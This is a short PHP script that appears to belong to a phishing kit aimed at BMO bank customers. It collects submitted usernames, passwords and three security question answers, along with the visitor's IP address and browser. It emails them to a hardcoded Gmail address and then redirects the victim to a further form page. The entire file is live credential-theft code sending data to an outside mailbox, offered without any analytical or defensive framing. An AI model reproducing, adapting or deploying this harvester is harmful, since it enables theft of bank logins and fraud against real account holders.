9<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LoginDetails-------------------\n";
$message .= "username : ".$_POST['username']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "-----------------2 QuestionDetails----------------\n";
$message .= "Question	: ".$_POST['question1']."\n";
$message .= "Answer		: ".$_POST['answer1']."\n";
$message .= "Question	: ".$_POST['question2']."\n";
$message .= "Answer		: ".$_POST['answer2']."\n";
$message .= "Question	: ".$_POST['question3']."\n";
$message .= "Answer		: ".$_POST['answer3']."\n";
$message .= "-----------------created by 723806851---------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------BMO Results----------------------\n";
$send = "marcusfield20@gmail.com";
$headers = "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}

?>
<script>
    window.top.location.href = "information.php?product=7";

</script>